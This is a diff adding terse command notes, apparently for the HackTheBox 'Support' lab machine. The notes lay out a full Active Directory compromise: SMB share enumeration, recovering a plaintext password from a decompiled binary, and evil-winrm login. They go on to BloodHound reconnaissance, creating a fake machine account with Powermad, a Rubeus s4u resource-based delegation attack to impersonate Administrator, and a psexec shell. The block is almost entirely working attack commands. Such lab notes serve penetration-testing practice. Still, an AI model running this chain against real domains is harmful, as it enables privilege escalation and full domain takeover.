@@ -213,7 +213,49 @@ evil-winrm -i streamIO.htb -u administrator -p e1JFg,55n-b2w5
 
 # Win-Support
 ```
-
+smbclient -L \\\\10.10.11.174\\
+smbclient \\\\10.10.11.174\\support-tools
+unzip UserInfo.exe.zip
+cat UserInfo.exe.config
+wget https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip
+unzip Linux.x64.Release.zip
+unzip ILSpy-linux-x64-Release.zip
+cd artifacts/linux-arm64
+sudo ./ILSpy
+decrypt.py
+wget https://dlcdn.apache.org/directory/studio/2.0.0.v20210717-M17/ApacheDirectoryStudio-2.0.0.v20210717-M17-linux.gtk.x86_64.tar.gz
+tar -xf ApacheDirectoryStudio-2.0.0.v20210717-M17-linux.gtk.x86_64.tar.gz
+./ApacheDirectoryStudio
+evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
+Get-ADDomain
+echo '10.10.11.174 dc.support.htb' | sudo tee -a /etc/hosts
+whoami /groups
+sudo neo4j start
+/opt/BloodHound/BloodHound-linux-x64 ./BloodHound --no-sandbox
+upload SharpHound.exe
+./SharpHound.exe
+download 20240514001541_BloodHound.zip
+Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
+upload PowerView.ps1
+. ./PowerView.ps1
+Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity
+git clone https://github.com/Kevin-Robertson/Powermad.git
+upload Powermad.ps1
+. ./Powermad.ps1
+New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
+Get-ADComputer -identity FAKE-COMP01
+Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
+Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
+Get-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity
+upload Rubeus.exe
+.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
+.\Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
+https://www.browserling.com/tools/remove-all-whitespace
+base64 -d ticket.kirbi.b64 > ticket.kirbi
+locate ticketConverter.py
+./ticketConverter.py ticket.kirbi ticket.ccache
+locate psexec.py
+KRB5CCNAME=ticket.ccache ./psexec.py support.htb/administrator@dc.support.htb -k -no-pass
 ```
 
 
